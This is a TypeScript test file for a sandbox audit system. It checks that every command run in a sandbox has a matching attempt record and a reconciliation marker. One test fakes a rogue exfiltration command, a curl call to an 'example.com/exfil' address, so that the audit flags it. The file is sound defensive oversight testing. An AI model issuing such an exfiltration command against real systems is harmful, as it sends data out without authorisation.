/**
 * Sandbox audit-accounting tests (plan Part 11, acceptance criterion 6):
 * the provider's command ledger — the sandbox audit log — must account for
 * ALL execution. A full engine sequence (split-lineage source acquisition
 * plus a gated command) audits clean: every recorded command has a persisted
 * execution-attempt record and carries its reconciliation marker. A command
 * that reached the sandbox around the attempt protocol, or without its
 * marker, is a finding that fails the audit.
 */
import assert from "node:assert/strict";
import { test } from "node:test";

import type { SandboxBindingV1 } from "../../ensemble-contract/src/sandboxBindingV1";
import { allocateHex128IdV1 } from "../../ensemble-core/src/actionCorrelationV1";
import { createRecordingEventSinkV1 } from "../src/engineEventsV1";
import { deriveExecutionAttemptKeyV1 } from "../src/executionAttemptStoreV1";
import { createEngineGateMachineryV1 } from "../src/gateMachineryV1";
import { auditSandboxCommandAccountingV1 } from "../src/sandboxAuditV1";
import {
  buildMarkedSandboxCommandV1,
  createInMemorySandboxClientV1,
  RecordedSandboxCommandV1,
} from "../src/sandboxClientV1";
import {
  acquireSourcePerBindingV1,
  createSandboxCommandEffectV1,
  SandboxExecutionContextV1,
} from "../src/sandboxExecutionV1";

const TASK_ID = "task-audit-demo";
const OWNER_ID = "user-owner-1";
const SANDBOX_ID = "sbx-audit";
const ROOT = "/workspace/repo";

function binding(): SandboxBindingV1 {
  return {
    bindingId: "binding-audit-1",
    ownerUserId: OWNER_ID,
    provider: "e2b",
    sandboxId: SANDBOX_ID,
    source: { kind: "gitClone", repoUrl: "https://example.com/repo.git", ref: "main" },
    workingDirectoryRoot: ROOT,
    lifecycle: "task-owned-ephemeral",
    cleanup: "destroy-on-completion",
  };
}

function fullRunFixture(): {
  readonly context: SandboxExecutionContextV1;
  readonly machinery: ReturnType<typeof createEngineGateMachineryV1>;
  readonly ledger: () => readonly RecordedSandboxCommandV1[];
} {
  const client = createInMemorySandboxClientV1({
    onCommand: (request, self) => {
      // Simulate the clone materializing the working tree.
      if (request.argv[0] === "git" && request.argv[1] === "clone") {
        self.addDirectory(request.sandboxId, ROOT);
      }
      return undefined;
    },
  });
  const context: SandboxExecutionContextV1 = { binding: binding(), client };
  const machinery = createEngineGateMachineryV1({
    taskId: TASK_ID,
    ownerId: OWNER_ID,
    workerId: "worker-audit",
    sink: createRecordingEventSinkV1(),
  });
  return { context, machinery, ledger: () => client.executedCommands };
}

test("a full engine sequence audits clean: every executed command is accounted for and marked", async () => {
  const { context, machinery, ledger } = fullRunFixture();

  const acquisition = await acquireSourcePerBindingV1(machinery, context);
  assert.ok(acquisition.acquired, JSON.stringify(acquisition.steps));

  const gate = await machinery.openGate({ summary: "run the generated tests" });
  const decided = await machinery.decide({
    gateId: gate.gateId,
    decision: "approve",
    idempotencyKey: allocateHex128IdV1(),
  });
  assert.equal(decided.kind, "decided");
  const resumed = await machinery.resumeApproved(
    gate.gateId,
    createSandboxCommandEffectV1(context, { argv: ["npm", "test"] })
  );
  assert.equal(resumed.kind, "executed");

  // Clone + checkout + gated command: three executions, three attempt keys.
  const commands = ledger();
  assert.equal(commands.length, 3);
  assert.equal(new Set(commands.map((command) => command.attemptKey)).size, 3);

  const report = await auditSandboxCommandAccountingV1(commands, machinery.attemptStore);
  assert.equal(report.ok, true, JSON.stringify(report.findings));
  assert.equal(report.commandsAudited, 3);
  assert.deepEqual(report.findings, []);
});

test("a command that bypassed the attempt protocol is an unaccounted audit finding", async () => {
  const { context, machinery, ledger } = fullRunFixture();
  await acquireSourcePerBindingV1(machinery, context);

  // A rogue pathway issues a command with a well-formed key that was never
  // persisted as an attempt record.
  const rogueKey = deriveExecutionAttemptKeyV1({
    taskId: TASK_ID,
    gateId: "rogue-step-never-begun",
    effectKind: "sandboxCommand",
    lineage: 0,
  });
  await context.client.runCommand({
    sandboxId: SANDBOX_ID,
    argv: ["curl", "https://example.com/exfil"],
    cwd: ROOT,
    attemptKey: rogueKey,
  });

  const report = await auditSandboxCommandAccountingV1(ledger(), machinery.attemptStore);
  assert.equal(report.ok, false);
  assert.equal(report.findings.length, 1);
  const finding = report.findings[0]!;
  assert.equal(finding.problem, "noAttemptRecord");
  assert.equal(finding.command.attemptKey, rogueKey);
  assert.deepEqual(finding.command.argv, ["curl", "https://example.com/exfil"]);
});

test("an execution recorded without its reconciliation marker is an audit finding", async () => {
  const { machinery } = fullRunFixture();
  const attemptKey = deriveExecutionAttemptKeyV1({
    taskId: TASK_ID,
    gateId: "step-x",
    effectKind: "sandboxCommand",
    lineage: 0,
  });
  await machinery.attemptStore.begin({
    attemptKey,
    taskId: TASK_ID,
    gateId: "step-x",
    effectKind: "sandboxCommand",
    lineage: 0,
  });

  const unmarked: RecordedSandboxCommandV1 = {
    sandboxId: SANDBOX_ID,
    argv: ["ls"],
    cwd: ROOT,
    attemptKey,
    // A provider entry whose command line lost (or never carried) the marker.
    commandText: "'ls'",
    exitCode: 0,
  };
  const marked: RecordedSandboxCommandV1 = {
    ...unmarked,
    commandText: buildMarkedSandboxCommandV1(["ls"], attemptKey),
  };

  const report = await auditSandboxCommandAccountingV1([unmarked, marked], machinery.attemptStore);
  assert.equal(report.ok, false);
  assert.equal(report.findings.length, 1);
  assert.equal(report.findings[0]!.problem, "markerMissing");
});
